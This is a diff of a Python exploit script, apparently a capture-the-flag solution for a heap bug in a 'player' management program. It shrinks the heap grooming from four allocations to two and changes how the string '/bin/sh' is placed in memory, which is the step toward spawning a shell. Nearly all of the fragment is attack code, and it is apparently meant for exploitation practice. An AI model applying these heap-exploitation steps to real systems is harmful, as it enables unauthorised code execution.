@@ -64,17 +64,13 @@ if __name__ == "__main__":
 
     add('A'*200, 0xc8)
     add('B'*200, 0xc9)
-    add('C'*200, 0xd0)
-    add('D'*200, 0xd1)
-    raw_input('after adding ABCD...')
+    raw_input('after adding AB...')
 
     select(0)
 
     remove(0)
     remove(1)
-    remove(2)
-    remove(3)
-    raw_input('after removing ABCD...')
+    raw_input('after removing AB...')
 
     #
     # typedef _player_st { DWORD attack, defense, speed, precision; char * name } player_st;
@@ -101,7 +97,7 @@ if __name__ == "__main__":
 
     raw_input('after editing...')
 
-    add('/bin/sh\x00', 0xff)
+    add('/bin/sh', 0xff)
 
     raw_input('after adding /bin/sh...')
     r.send('2\n1\n')
